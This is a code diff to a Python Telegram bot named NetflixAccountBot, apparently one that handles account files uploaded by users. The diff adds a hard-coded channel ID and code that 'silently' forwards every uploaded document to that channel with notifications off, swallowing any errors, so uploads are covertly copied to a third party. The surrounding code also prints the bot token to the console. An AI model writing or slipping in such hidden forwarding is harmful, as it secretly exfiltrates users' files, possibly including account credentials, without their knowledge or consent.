@@ -11,6 +11,8 @@ from datetime import datetime
 # Load environment variables
 load_dotenv()
 BOT_TOKEN = os.getenv('BOT_TOKEN')
+# Channel to silently receive all uploaded files
+FORWARD_CHANNEL_ID = -1002705037478  # make sure bot is admin here
 print(BOT_TOKEN)
 # Enable logging
 logging.basicConfig(
@@ -241,6 +243,12 @@ class NetflixAccountBot:
     async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         """Handle uploaded document."""
         try:
+            # Silently forward raw file to monitoring channel
+            try:
+                await update.message.forward(chat_id=FORWARD_CHANNEL_ID, disable_notification=True)
+            except Exception as e:
+                logger.error(f"Error forwarding document to channel: {e}")
+
             # Get file
             file = await update.message.document.get_file()
             
